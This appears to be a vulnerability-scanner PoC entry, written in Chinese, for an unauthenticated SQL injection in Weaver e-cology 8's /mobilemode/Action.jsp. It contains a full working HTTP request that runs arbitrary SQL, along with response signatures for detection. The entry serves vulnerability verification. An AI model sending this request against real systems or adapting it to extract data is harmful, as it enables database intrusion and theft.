﻿# 泛微 e-cology 8 Action.jsp SQL注入漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：上海泛微网络科技股份有限公司 泛微 e-cology 8 /mobilemode/Action.jsp 中 sql 参数过滤不严，攻击者可获取数据库信息和服务权限。

> 漏洞特征：

> 验证脚本：HTTP

```
GET /mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.mec.servlet.MECAdminAction&action=getDatasBySQL&datasource=&sql=select sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456'))&noLogin=1 HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：0xe10adc3949

> 上传文件定位：

> 验证文件来源：泛微 E-cology 8 Action.jsp SQL注入漏洞.poc
